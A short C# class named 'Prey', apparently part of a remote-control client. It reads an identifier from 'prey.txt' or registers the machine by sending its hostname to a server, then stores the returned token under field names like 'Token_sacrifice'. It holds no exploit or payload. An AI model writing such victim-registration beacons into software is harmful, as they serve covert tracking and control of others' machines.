using System;
using System.Collections.Generic;
using System.Net;
using System.Linq;
using System.IO;
using System.Text;
using System.Threading.Tasks;

namespace AliceSRV
{
    class Prey
    {
        public IPEndPoint ip { get; set; }
        public string Name_sacrifice { get; set; }
        public string Token_sacrifice { get; set; }


        public Prey(string IP_sacrifice, int IP_Port, string Name_sacrifice, string Token_sacrifice)
        {
            IPAddress ip_adr =IPAddress.Parse( IP_sacrifice);
            this.ip = new IPEndPoint(ip_adr, IP_Port);
            this.Name_sacrifice = Name_sacrifice;
            this.Token_sacrifice = Token_sacrifice;
        }

        public Prey(Connection server1)
        {
            string file = "prey.txt";
            string _prey = "";
            try
            {
                _prey = File.ReadAllText(file);
            }
            catch(Exception ex)
            {
               
            }

            if (_prey != "")
            {
                this.Name_sacrifice = BaseTool._GetArrSplit(_prey)[0];
                this.Token_sacrifice = BaseTool._GetArrSplit(_prey)[1];
                Console.WriteLine(Name_sacrifice +" "+Token_sacrifice);
                
            }
            else
            {
                this.Name_sacrifice = Environment.MachineName;
                byte[] _data = BaseTool.Convertbtst("[prey_get_token][" + this.Name_sacrifice + "]");
                server1.Send_mess(_data);
                byte[] _reciv = server1.Whait_recive();
                string _strrec = BaseTool.Convertbtst(_reciv);
                Console.WriteLine(_strrec);

                this.Token_sacrifice = BaseTool._GetArrSplit(_strrec)[1];
                File.WriteAllText(file, "[" + this.Name_sacrifice + "][" + this.Token_sacrifice + "]");
            }
        }


    }
}
